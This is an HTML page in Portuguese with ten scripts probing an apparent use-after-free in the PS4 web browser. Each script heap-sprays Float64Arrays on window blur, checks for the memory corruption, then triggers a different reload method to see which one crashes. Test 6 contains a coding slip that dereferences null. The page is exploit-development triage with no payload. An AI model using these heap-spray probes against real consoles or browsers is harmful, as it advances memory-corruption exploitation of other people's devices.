
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Auto Refresh Analysis</title>
</head>
<body>

<h1>PS4 UAF - Testes Automáticos de Refresh</h1>

<h2>ESTRATÉGIA CORRIGIDA</h2>
<p>Testes executam AUTOMATICAMENTE após onblur, sem precisar clicar em nada</p>

<hr>

<h2>TESTE AUTO 1: Soft Reload (Baseline)</h2>
<button onclick="runAutoTest1()">EXECUTAR - Aperte OPTIONS</button>
<div id="result1"></div>

<script>
function runAutoTest1() {
    const result = document.getElementById('result1');
    result.innerHTML = '<h3>TESTE AUTO 1: location.reload()</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>location.reload() em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: location.reload()</p>';
            location.reload();
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 2: Hard Reload</h2>
<button onclick="runAutoTest2()">EXECUTAR - Aperte OPTIONS</button>
<div id="result2"></div>

<script>
function runAutoTest2() {
    const result = document.getElementById('result2');
    result.innerHTML = '<h3>TESTE AUTO 2: location.reload(true)</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>location.reload(true) em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: location.reload(true) [HARD]</p>';
            location.reload(true);
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 3: Location Replace</h2>
<button onclick="runAutoTest3()">EXECUTAR - Aperte OPTIONS</button>
<div id="result3"></div>

<script>
function runAutoTest3() {
    const result = document.getElementById('result3');
    result.innerHTML = '<h3>TESTE AUTO 3: location.replace()</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>location.replace() em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: location.replace()</p>';
            location.replace(location.href);
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 4: History Go</h2>
<button onclick="runAutoTest4()">EXECUTAR - Aperte OPTIONS</button>
<div id="result4"></div>

<script>
function runAutoTest4() {
    const result = document.getElementById('result4');
    result.innerHTML = '<h3>TESTE AUTO 4: history.go(0)</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>history.go(0) em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: history.go(0)</p>';
            history.go(0);
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 5: Window Open Self</h2>
<button onclick="runAutoTest5()">EXECUTAR - Aperte OPTIONS</button>
<div id="result5"></div>

<script>
function runAutoTest5() {
    const result = document.getElementById('result5');
    result.innerHTML = '<h3>TESTE AUTO 5: window.open(_self)</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>window.open(_self) em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: window.open(_self)</p>';
            window.open(location.href, '_self');
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 6: Location Href Reassign</h2>
<button onclick="runAutoTest6()">EXECUTAR - Aperte OPTIONS</button>
<div id="result6"></div>

<script>
function runAutoTest6() {
    const result = document.getElementById('result6');
    result.innerHTML = '<h3>TESTE AUTO 6: location.href = location.href</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = corrupted[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>location.href = location.href em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: location.href reassign</p>';
            location.href = location.href;
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 7: Location Assign</h2>
<button onclick="runAutoTest7()">EXECUTAR - Aperte OPTIONS</button>
<div id="result7"></div>

<script>
function runAutoTest7() {
    const result = document.getElementById('result7');
    result.innerHTML = '<h3>TESTE AUTO 7: location.assign()</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>location.assign() em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: location.assign()</p>';
            location.assign(location.href);
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 8: Document Write + Reload</h2>
<button onclick="runAutoTest8()">EXECUTAR - Aperte OPTIONS</button>
<div id="result8"></div>

<script>
function runAutoTest8() {
    const result = document.getElementById('result8');
    result.innerHTML = '<h3>TESTE AUTO 8: document.write + reload</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>document.write + reload em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: document.write</p>';
            document.open();
            document.write('<html><body><h1>Reloading...</h1></body></html>');
            document.close();
            setTimeout(() => location.reload(), 500);
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 9: Document Location Replace</h2>
<button onclick="runAutoTest9()">EXECUTAR - Aperte OPTIONS</button>
<div id="result9"></div>

<script>
function runAutoTest9() {
    const result = document.getElementById('result9');
    result.innerHTML = '<h3>TESTE AUTO 9: document.location.replace()</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>document.location.replace() em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: document.location.replace()</p>';
            document.location.replace(document.location.href);
        }, 3000);
    };
}
</script>

<hr>

<h2>TESTE AUTO 10: Meta Refresh</h2>
<button onclick="runAutoTest10()">EXECUTAR - Aperte OPTIONS</button>
<div id="result10"></div>

<script>
function runAutoTest10() {
    const result = document.getElementById('result10');
    result.innerHTML = '<h3>TESTE AUTO 10: Meta refresh tag</h3>';
    result.innerHTML += '<p>Aperte OPTIONS agora</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - UAF iniciado</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3 style="color:green;">UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>Meta refresh em 3 segundos...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: Meta refresh</p>';
            const meta = document.createElement('meta');
            meta.httpEquiv = 'refresh';
            meta.content = '0';
            document.head.appendChild(meta);
        }, 3000);
    };
}
</script>

<hr>

<h2>INSTRUÇÕES</h2>
<ol>
<li>Execute cada teste UM POR VEZ</li>
<li>Clique no botão do teste</li>
<li>Aperte OPTIONS no controle</li>
<li>Aguarde 3 segundos</li>
<li>O reload acontecerá AUTOMATICAMENTE</li>
<li>Anote se CRASHOU ou NÃO</li>
</ol>

<h2>CHECKLIST DE RESULTADOS</h2>
<table border="1">
<tr><th>Teste</th><th>Método</th><th>Crashou?</th></tr>
<tr><td>1</td><td>location.reload()</td><td>____</td></tr>
<tr><td>2</td><td>location.reload(true)</td><td>____</td></tr>
<tr><td>3</td><td>location.replace()</td><td>____</td></tr>
<tr><td>4</td><td>history.go(0)</td><td>____</td></tr>
<tr><td>5</td><td>window.open(_self)</td><td>____</td></tr>
<tr><td>6</td><td>location.href = href</td><td>____</td></tr>
<tr><td>7</td><td>location.assign()</td><td>____</td></tr>
<tr><td>8</td><td>document.write + reload</td><td>____</td></tr>
<tr><td>9</td><td>document.location.replace()</td><td>____</td></tr>
<tr><td>10</td><td>Meta refresh tag</td><td>____</td></tr>
</table>

<p><b>Depois compare com botão ATUALIZAR do PS4</b></p>

<h2>ANÁLISE</h2>
<p>Se ALGUM método crashar: Esse é o comportamento do botão ATUALIZAR!</p>
<p>Se NENHUM crashar: Botão usa API especial do sistema</p>

</body>
</html>
